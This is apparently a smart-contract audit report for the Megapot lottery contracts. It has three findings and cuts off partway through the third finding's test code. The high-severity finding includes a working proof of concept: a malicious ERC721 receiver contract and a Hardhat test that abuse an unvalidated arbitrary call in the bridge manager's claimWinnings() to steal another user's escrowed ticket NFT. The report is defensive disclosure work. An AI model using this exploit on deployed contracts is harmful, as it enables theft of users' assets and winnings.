# Megapot

## Findings Summary

| ID | Title | Duplicates | 
| - | - | - |
| [H-01](#arbitrary-calls-in-jackpotbridgemanagerclaimwinnings-may-allow-theft-of-winning-nfts) | Arbitrary calls in JackpotBridgeManager::claimWinnings() may allow theft of winning NFTs | 11 |
| [M-01](#modifying-ticketprice-mid-drawing-will-cause-issues-in-jackpotbridgemanagerbuytickets) | Modifying ticketPrice mid-drawing will cause issues in JackpotBridgeManager::buyTickets() | 38 |
| [M-02](#modifying-the-referral-fee-mid-drawing-introduces-unfairness) | Modifying the referral fee mid-drawing introduces unfairness | 74 |

## Arbitrary calls in JackpotBridgeManager::claimWinnings() may allow theft of winning NFTs
## Vulnerability Detail

```solidity
function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature) external nonReentrant {
    if (_userTicketIds.length == 0) revert JackpotErrors.NoTicketsToClaim(); 

    bytes32 eipHash = createClaimWinningsEIP712Hash(_userTicketIds, _bridgeDetails);
    address signer = ECDSA.recover(eipHash, _signature);

    _validateTicketOwnership(_userTicketIds, signer);

    uint256 preUSDCBalance = usdc.balanceOf(address(this));
    jackpot.claimWinnings(_userTicketIds);
    uint256 postUSDCBalance = usdc.balanceOf(address(this));
    uint256 claimedAmount = postUSDCBalance - preUSDCBalance;

    if (claimedAmount == 0) revert InvalidClaimedAmount();

>   _bridgeFunds(_bridgeDetails, claimedAmount);

    emit WinningsClaimed(signer, _bridgeDetails.to, _userTicketIds, claimedAmount); 
}

function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {
    // Approval address is determined off-chain based on whether depository or approvalProxy is being used
    // If the route requires a direct transfer to a solver the approval address will be 0 and we will
    // skip approval.
    if (_bridgeDetails.approveTo != address(0)) {
        usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
    } 

    uint256 preUSDCBalance = usdc.balanceOf(address(this));
>   (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);

    if (!success) revert BridgeFundsFailed();
    uint256 postUSDCBalance = usdc.balanceOf(address(this));

>   if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged(); 

    emit FundsBridged(_bridgeDetails.to, _claimedAmount);
}
```

`JackpotBridgeManager` purchases tickets and claims winnings on behalf of users.

That is, when users purchase tickets, the `JackpotBridgeManager` will escrow the tickets.

When users claim via `JackpotBridgeManager::claimWinnings()`, the signature is verified, ticket ownership is checked, then the user’s tickets are redeemed.

`_bridgeFunds()` is executed at the end of `JackpotBridgeManager::claimWinnings()` and handles the forwarding of `USDC` winnings that were received from `Jackpot::claimWinnings()`.

An arbitrary call is made to `_bridgeDetails.to`, which is provided as input to `JackpotBridgeManager::claimWinnings()` and passed directly to `_bridgeFunds()` without any input validation.

This is dangerous as this can allow callers to execute any action on behalf of `JackpotBridgeManager`. 

- Since `JackpotBridgeManager` escrows user’s ticket NFTs, a malicious user can format the payload to transfer another user’s NFT
- `JackpotBridgeManager::claimWinnings()` will not revert as long as the user’s winnings are transferred out of `JackpotBridgeManager`.
    - As long as claimed winnings are also pulled in arbitrary call, the call will succeed.
        - This can be accomplished by implementing a malicious receiver with custom logic in the `onERC721Received()` hook to also pull `USDC` from `JackpotBridgeManager`.

As a result, a malicious user may be able to steal another user’s ticket NFT from `JackpotBridgeManager`.

Constraints:

- Users can only steal NFTs from other users, who have purchased tickets from `JackpotBridgeManager`.
    - That is, users who directly purchased tickets from `Jackpot` cannot steal NFTs from `JackpotBridgeManager`.
- Malicious users must have at least one ticket with a non-zero `claimedAmount`
    - That is, the malicious user must have a ticket with moderate to high matches and `premierTierWeight[tierId for user ticket] != 0`
- Arbitrary call must also claim the user’s winnings to succeed.

### PoC

1. Copy and paste the code below into `contracts/mocks/MaliciousReceiver.sol`
    
    This will be the auxiliary receiver contract used to exploit `JackpotBridgeManager`
    

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract MaliciousReceiver is IERC721Receiver {
    using SafeERC20 for IERC20;

    IERC20 usdc;
    address jackpotBridgeManager;
    address owner;

    constructor(address _owner, address _usdc, address _jackpotBridgeManager) {
        owner = _owner;
        usdc = IERC20(_usdc);
        jackpotBridgeManager = _jackpotBridgeManager;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // pull + forward USDC claimed earnings
        if (operator == jackpotBridgeManager) {
            uint256 allowance = usdc.allowance(jackpotBridgeManager, address(this));
            usdc.safeTransferFrom(jackpotBridgeManager, owner, allowance);
        }

        // forward received NFT to owner
        IERC721(msg.sender).safeTransferFrom(address(this), owner, tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
```

1. Make the following edits in `utils/contracts.ts` and `utils/deploy.ts`, respectively.
    
    Unfortunately, due to the way the test suite is configured, additional ‘wiring’ is required for `MaliciousReceiver` to be visible in the provided test suite. 
    

```solidity
// utils/contracts.ts
export {
  // SNIP
  MaliciousReceiver,
} from "../typechain-types";
```

```solidity
// utils/deploy.ts
import {
  // SNIP
  MaliciousReceiver,
} from "./contracts";

import {
  // SNIP
  MaliciousReceiver__factory,
} from "../typechain-types/factories/contracts/mocks";
    
public async deployMaliciousReceiver(owner: Address, usdc: Address, jackpotBridgeManager: Address): Promise<MaliciousReceiver> {
    return await new MaliciousReceiver__factory(this._deployerSigner).deploy(owner, usdc, jackpotBridgeManager);
}
```

1. Copy and paste the code below into `C4PoC.spec.ts`
    
    Run with the following command: `yarn test:poc`
    

```solidity
import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProviderMock,
  MaliciousReceiver,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
  LPDrawingState,
  DrawingState,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO,
  ONE_DAY_IN_SECONDS, PRECISE_UNIT, ZERO, ZERO_BYTES32 } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let lenderOne: Account;
  let lenderTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProviderMock;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;
  let maliciousReceiver: MaliciousReceiver;

  const drawingDurationInSeconds: bigint = ONE_DAY_IN_SECONDS;
  const entropyFee: bigint = ether(0.00005);
  const entropyBaseGasLimit: bigint = BigInt(1000000);
  const entropyVariableGasLimit: bigint = BigInt(250000);

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      lenderOne,
      lenderTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;
    entropyProvider = jackpotSystem.entropyProvider;

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    // @audit-info buyerOne = attacker
    maliciousReceiver = await jackpotSystem.deployer.deployMaliciousReceiver(
      buyerOne.address,
      await usdcMock.getAddress(),
      await jackpotBridgeManager.getAddress()
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC4", async () => {
    let buyerOneTicketInfo: Ticket[];
    let buyerOneTicketIds: bigint[];

    let buyerTwoTicketInfo: Ticket[];
    let buyerTwoTicketIds: bigint[];

    let subjectUserTicketIds: bigint[];
    let subjectBridgeDetails: RelayTxData;
    let subjectSignature: string;

    async function subject(): Promise<any> {
      return await jackpotBridgeManager.connect(buyerTwo.wallet).claimWinnings(
        subjectUserTicketIds,
        subjectBridgeDetails,
        subjectSignature
      );
    }    
    
    it("JackpotBridgeManager Theft", async () => {
      await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(1000));
      await usdcMock.connect(owner.wallet).transfer(buyerTwo.address, usdc(1000));

      buyerOneTicketInfo = [ // buyerOne purchases 1 tickets via BridgeManager
        {
          normals: [BigInt(1), BigInt(7), BigInt(8), BigInt(4), BigInt(5)],
          bonusball: BigInt(2)
        } as Ticket,
      ];
      
      await usdcMock.connect(buyerOne.wallet).approve(jackpotBridgeManager.getAddress(), usdc(10));
      const buyerOneTicketIds = await jackpotBridgeManager.connect(buyerOne.wallet).buyTickets.staticCall(
        buyerOneTicketInfo,
        buyerOne.address,
        [],
        [],
        ethers.encodeBytes32String("test")
      );

      await jackpotBridgeManager.connect(buyerOne.wallet).buyTickets(
        buyerOneTicketInfo,
        buyerOne.address,
        [],
        [],
        ethers.encodeBytes32String("test")
      );

      buyerTwoTicketInfo = [ // buyerTwo purchases 1 ticket via BridgeManager
        {
          normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(10), BigInt(20)],
          bonusball: BigInt(2)
        } as Ticket
      ];
      
      await usdcMock.connect(buyerTwo.wallet).approve(jackpotBridgeManager.getAddress(), usdc(10));
      const buyerTwoTicketIds = await jackpotBridgeManager.connect(buyerOne.wallet).buyTickets.staticCall(
        buyerTwoTicketInfo,
        buyerTwo.address,
        [],
        [],
        ethers.encodeBytes32String("test")
      );
      
      await jackpotBridgeManager.connect(buyerTwo.wallet).buyTickets(
        buyerTwoTicketInfo,
        buyerTwo.address,
        [],
        [],
        ethers.encodeBytes32String("test")
      );

      // elapse time + drawing concludes
      await time.increase(jackpotSystem.deploymentParams.drawingDurationInSeconds + BigInt(1));
      await jackpot.connect(owner.wallet).runJackpot(
        { value: BigInt(100000000000000000n) }   // just overpay since it refunds
      );
      
      // winning ticket -> [1, 7, 8, 10, 20][2] 
      await entropyProvider.connect(owner.wallet).randomnessCallback([[BigInt(1), BigInt(7), BigInt(8), BigInt(10), BigInt(20)], [BigInt(2)]]);

      /**
       *  buyerOne Ticket 1: 3 Matches + Bonus Ball -> [1, 7, 8][2] = Tier 7
       *  buyerTwo Ticket 1: 4 Matches + Bonus Ball -> [7, 8, 10, 20][2] = Tier 9
       */
      // @audit-info malicious user must have non-zero winnings to execute this attack -> JackpotBridgeManager::claimWinnings() L238
      let buyerOneWinnings = await payoutCalculator.getTierPayout(1, 7);
      expect(buyerOneWinnings).to.equal(3989906n);

      /**
       *  @audit-info buyerOne formats a payload that will:
       *  1. Approves maliciousReceiver to spend USDC
       *  2. Makes an arbitrary call to JackpotNFT and transfer buyerTwo's NFT to maliciousReceiver
       * 
       *  By overriding the onERC721Received() hook, maliciousReceiver can execute custom logic to:
       *  1. Pull USDC on receipt of any NFT, if the operator is JackpotBridgeManager
       *  2. Forward the received NFT to the owner - in the context of this PoC, the NFT will be a stolen JackpotNFT
       */
      subjectUserTicketIds = [...buyerOneTicketIds];
      subjectBridgeDetails = {
          approveTo: await maliciousReceiver.getAddress(),
          to: await jackpotNFT.getAddress(),
          data: jackpotNFT.interface.encodeFunctionData("safeTransferFrom(address,address,uint256)", [
            await jackpotBridgeManager.getAddress(),
            await maliciousReceiver.getAddress(),
            buyerTwoTicketIds[0]
          ])
      };

      subjectSignature = await generateClaimWinningsSignature(
        await jackpotBridgeManager.getAddress(),
        subjectUserTicketIds,
        subjectBridgeDetails,
        buyerOne.wallet
      );

      // pre-claimWinnings()
      let preClaimBuyerTwoTickets = await jackpotBridgeManager.getUserTickets(buyerTwo.address, 1);
      expect(preClaimBuyerTwoTickets.length).to.equal(1n);
      expect(preClaimBuyerTwoTickets[0]).to.equal(buyerTwoTicketIds[0]);

      let preBuyerOneUSDCBalance = await usdcMock.balanceOf(buyerOne.address);

      await jackpotBridgeManager.connect(buyerOne.wallet).claimWinnings(
        subjectUserTicketIds,
        subjectBridgeDetails,
        subjectSignature
      );

      // post-claimWinnings()
      // @audit-info buyerOne receives non-zero winnings for purchased ticket
      let postBuyerOneUSDCBalance = await usdcMock.balanceOf(buyerOne.address);
      let difference = postBuyerOneUSDCBalance - preBuyerOneUSDCBalance;
      expect(difference).to.greaterThan(0n);

      // @audit-info buyerOne owns buyerTwo's ticket
      let newOwner = await jackpotNFT.ownerOf(buyerTwoTicketIds[0]);
      expect(newOwner).to.equal(buyerOne.address);

      // @audit-info buyerTwo can no longer call JackpotBridgeManager::claimTickets() or JackpotBridgeManager::claimWinnings()
      let buyerTwoWinnings = await payoutCalculator.getTierPayout(1, 9);
      subjectUserTicketIds = [...buyerTwoTicketIds];
      subjectBridgeDetails = {
        approveTo: await mockDepository.getAddress(),
        to: await mockDepository.getAddress(),
        data: mockDepository.interface.encodeFunctionData("depositErc20", [
          await jackpotBridgeManager.getAddress(),
          await usdcMock.getAddress(),
          buyerTwoWinnings,
          ethers.encodeBytes32String("test")
        ])
      };

      subjectSignature = await generateClaimWinningsSignature(
        await jackpotBridgeManager.getAddress(),
        subjectUserTicketIds,
        subjectBridgeDetails,
        buyerTwo.wallet
      );

      // @audit-info buyerTwo attempts to claimWinnings via JackpotBridgeManager
      // JackpotBridgeManager::_validateTicketOwnership() checks will pass because internal storage does not reflect the 'theft'
      // Will revert in Jackpot::claimWinnings() L426
      expect(subject()).to.be.revertedWithCustomError(jackpot, "NotTicketOwner");     
    });
  });
});
```

## Impact

Malicious users can utilize `JackpotBridgeManager::claimWinnings()` to steal NFTs from other users

## Recommendation

Consider implementing an allowlist of addresses and function selectors and bolster validation against `_bridgeDetails` inputs in `JackpotBridgeManager::_bridgeFunds()`.

## Modifying ticketPrice mid-drawing will cause issues in JackpotBridgeManager::buyTickets()

## Vulnerability Detail

```solidity
function buyTickets(
    IJackpot.Ticket[] memory _tickets,
    address _recipient,
    address[] memory _referrers,
    uint256[] memory _referralSplitBps,
    bytes32 _source
)
    external
    nonReentrant
    returns (uint256[] memory)
{
    if (_recipient == address(0)) revert JackpotErrors.ZeroAddress();
>   uint256 ticketPrice = jackpot.ticketPrice();  // @audit-info MUST be in USDC decimals
    uint256 currentDrawingId = jackpot.currentDrawingId(); // @audit-ok
    uint256 ticketCost = ticketPrice * _tickets.length; // @audit-ok

    usdc.safeTransferFrom(msg.sender, address(this), ticketCost); // @audit-ok
    usdc.approve(address(jackpot), ticketCost); 
    uint256[] memory ticketIds = jackpot.buyTickets(_tickets, address(this), _referrers, _referralSplitBps, _source); // @audit

    // Store the tickets in the user's mapping
    UserTickets storage userDrawingTickets = userTickets[_recipient][currentDrawingId];
    uint256 userTicketCount = userDrawingTickets.totalTicketsOwned;
    for (uint256 i = 0; i < _tickets.length; i++) { // @audit storage writes
        userDrawingTickets.ticketIds[userTicketCount + i] = ticketIds[i];
        ticketOwner[ticketIds[i]] = _recipient;
    }
    userDrawingTickets.totalTicketsOwned += _tickets.length; 

    emit TicketsBought(_recipient, currentDrawingId, ticketIds); // @audit-ok
    // event TicketsBought(address indexed _recipient, uint256 indexed _drawingId, uint256[] _ticketIds);

    return ticketIds;
}
```

`JackpotBridgeManager::buyTickets()` always fetches the global ticket price via `Jackpot::ticketPrice()`

`Jackpot` internally stores the `ticketPrice` for each `drawingId` in the `drawingState` mapping.

If the `ticketPrice` is modified mid-drawing, `Jackpot` is unaffected because `drawingState[currentDrawingId].ticketPrice` is used, which remains static throughout the duration of a drawing.

However, since `JackpotBridgeManager::buyTickets()` always fetches the global `ticketPrice`, changing the `ticketPrice` mid-drawing may present the following problems:

- If `ticketPrice` is increased mid-drawing, `JackpotBridgeManager` will accept more USDC than the current drawing price, which will result in stuck USDC in `JackpotBridgeManager` that cannot be rescued.
- If `ticketPrice` is decreased mid-drawing, `JackpotBridgeManager` will experience DoS, as the contract will not accept enough USDC from the user to forward to `Jackpot`.

### PoC

Set up: Copy and paste the code below into `C4PoC.spec.ts`

Run with following command: `yarn test:poc`

```solidity
import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProviderMock,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
  LPDrawingState,
  DrawingState,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO,
  ONE_DAY_IN_SECONDS, PRECISE_UNIT, ZERO, ZERO_BYTES32 } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let lenderOne: Account;
  let lenderTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProviderMock;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;

  const drawingDurationInSeconds: bigint = ONE_DAY_IN_SECONDS;
  const entropyFee: bigint = ether(0.00005);
  const entropyBaseGasLimit: bigint = BigInt(1000000);
  const entropyVariableGasLimit: bigint = BigInt(250000);

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      lenderOne,
      lenderTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;
    entropyProvider = jackpotSystem.entropyProvider;

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC", async () => {
    let buyerOneTicketInfo: Ticket[];
    let buyerOneTicketIds: bigint[];

    let buyerTwoTicketInfo: Ticket[];
    let buyerTwoTicketIds: bigint[];

    async function subject(): Promise<any> {
        return await jackpotBridgeManager.connect(buyerTwo.wallet).buyTickets(
            buyerTwoTicketInfo, // 1 ticket
            buyerTwo.address,
            [],
            [],
            ethers.encodeBytes32String("test")
        );
    }  
    
    it("ticketPrice increased mid-drawing results in stuck USDC", async () => {
        await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(1000));
        await usdcMock.connect(owner.wallet).transfer(buyerTwo.address, usdc(1000));
        
        buyerOneTicketInfo = [
            {
              normals: [BigInt(1), BigInt(2), BigInt(5), BigInt(7), BigInt(9)],
              bonusball: BigInt(1)
            } as Ticket
          ];

        // buyerOne puchases 1 ticket
        await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(10));
        await jackpot.connect(buyerOne.wallet).buyTickets(
            buyerOneTicketInfo, // 1 ticket
            buyerOne.address,
            [referrerOne.address], // 1 referrer
            [ether(1)],
            ethers.encodeBytes32String("test")
          );

        // @audit-info admin increases ticketPrice = 1 USDC -> 2 USDC mid-drawing
        // - The current drawing is not affected because 
        //     drawingState[currentDrawingId].ticketPrice is used in Jackpot::buyTickets()
        // - JackpotBridgeManager will now start requiring 2 USDC per ticket, 
        //     while Jackpot still only requires 1 USDC (until next drawing)
        await jackpot.connect(owner.wallet).setTicketPrice(ethers.parseUnits("2", 6));

        buyerTwoTicketInfo = [
            {
              normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(10), BigInt(20)],
              bonusball: BigInt(1)
            } as Ticket
          ];

        // buyerTwo purchases 1 ticket
        await usdcMock.connect(buyerTwo.wallet).approve(jackpotBridgeManager.getAddress(), usdc(20));
        await jackpotBridgeManager.connect(buyerTwo.wallet).buyTickets(
            buyerTwoTicketInfo, // 1 ticket
            buyerTwo.address,
            [],
            [],
            ethers.encodeBytes32String("test")
        );

        // @audit-info Jackpot only requires 1 USDC for the current drawing, so there's 1 USDC which is left in JackpotBridgeManager
        let jackpotBridgeManagerBalance = await usdcMock.balanceOf(jackpotBridgeManager.getAddress());
        expect(jackpotBridgeManagerBalance).to.equal(1000000n);
    });

    it("ticketPrice decreased mid-drawing results in DoS", async () => {
        await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(1000));
        await usdcMock.connect(owner.wallet).transfer(buyerTwo.address, usdc(1000));
        
        buyerOneTicketInfo = [
            {
              normals: [BigInt(1), BigInt(2), BigInt(5), BigInt(7), BigInt(9)],
              bonusball: BigInt(1)
            } as Ticket
          ];

        // buyerOne puchases 1 ticket
        await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(10));
        await jackpot.connect(buyerOne.wallet).buyTickets(
            buyerOneTicketInfo, // 1 ticket
            buyerOne.address,
            [referrerOne.address], // 1 referrer
            [ether(1)],
            ethers.encodeBytes32String("test")
          );

        // @audit-info admin increases ticketPrice = 1 USDC -> 0.8 USDC mid-drawing
        // - The current drawing is not affected because 
        //     drawingState[currentDrawingId].ticketPrice is used in Jackpot::buyTickets()
        // - JackpotBridgeManager will now start requiring 0.8 USDC per ticket, 
        //     while Jackpot still only requires 1 USDC (until next drawing)
        await jackpot.connect(owner.wallet).setTicketPrice(ethers.parseUnits("0.8", 6));

        buyerTwoTicketInfo = [
            {
              normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(10), BigInt(20)],
              bonusball: BigInt(1)
            } as Ticket
          ];

        // buyerTwo purchases 1 ticket
        await usdcMock.connect(buyerTwo.wallet).approve(jackpotBridgeManager.getAddress(), usdc(20));
                
        // @audit-info JackpotBridgeManager::buyTickets() will be DoSed until the next drawing
        // JackpotBridgeManager will only pull 0.8 USDC from the user and approve Jackpot to only spend 0.8 USDC
        // The ticketPrice of the current drawing is still 1 USDC, resulting in a revert when Jackpot attempts to pull 1 USDC
        expect(subject()).to.be.revertedWithCustomError(usdcMock, "ERC20InsufficientAllowance");
    });
  });
});
```

## Impact

Unintended DoS on `JackpotBridgeManager::butTickets()` if `ticketPrice` is decreased / Loss of funds for users + stuck funds in `JackpotBridgeManager` if `ticketPrice` is increased

## Tools Used

Manual Review

## Recommendation

Consider adding `getDrawingState()` to `IJackpot` interface and fetch `ticketPrice` for the `currentDrawingId` instead

## Modifying the referral fee mid-drawing introduces unfairness

## Vulnerability Detail

```solidity
function buyTickets(
    Ticket[] memory _tickets,
    address _recipient,
    address[] memory _referrers,
    uint256[] memory _referralSplit,
    bytes32 _source
)
    external
    nonReentrant
    noEmergencyMode
    returns (uint256[] memory ticketIds)
{
    _validateBuyTicketInputs(_tickets, _recipient, _referrers, _referralSplit); // @audit-ok 

    DrawingState storage currentDrawingState = drawingState[currentDrawingId]; // @audit-ok 
    
    uint256 numTicketsBought = _tickets.length;  // @audit-ok 
    uint256 ticketsValue = numTicketsBought * currentDrawingState.ticketPrice;
>   (uint256 referralFeeTotal, bytes32 referralSchemeId) = _validateAndTrackReferrals(_referrers, _referralSplit, ticketsValue); // @audit-ok

    // SNIP
}

function _validateAndTrackReferrals(
    address[] memory _referrers,
    uint256[] memory _referralSplit,
    uint256 _ticketsValue
)
    internal
    returns (uint256 referralFeeTotal, bytes32 referralSchemeId)
{
    if (_referrers.length > 0) {
        // Calculate total amount of referral fees for the order
>       referralFeeTotal = _ticketsValue * referralFee / PRECISE_UNIT; 
        // Calculate the referral scheme id for the order
        referralSchemeId = keccak256(abi.encode(_referrers, _referralSplit));

        // SNIP
    }
}
```

`Jackpot::buyTickets()` handles the ticket purchasing flow for users.

Internally, `_validateAndTrackReferrals()` will update the `referralFees` mapping if any referrers were provided (That is, if `_referrers.length != 0`)

In `_validateAndTrackReferrals()`, `referralFee` value used to calculate the `referralFeeTotal` is a global variable - If the admin updates this value mid-drawing, some users will be charged a different fee than the users prior to the update. 

This issue could also manifest if `referralFee` was updated and subsequently the system activates emergency mode - Users may receive not receive the correct amount if they purchased tickets prior to the `referralFee` update.

### PoC

Set up: Copy and paste the code below into `C4PoC.spec.ts`

Run with the following command: `yarn test:poc`

```solidity
import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProviderMock,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
  LPDrawingState,
  DrawingState,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO,
  ONE_DAY_IN_SECONDS, PRECISE_UNIT, ZERO, ZERO_BYTES32 } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let lenderOne: Account;
  let lenderTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProviderMock;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;

  const drawingDurationInSeconds: bigint = ONE_DAY_IN_SECONDS;
  const entropyFee: bigint = ether(0.00005);
  const entropyBaseGasLimit: bigint = BigInt(1000000);
  const entropyVariableGasLimit: bigint = BigInt(250000);

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      lenderOne,
      lenderTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
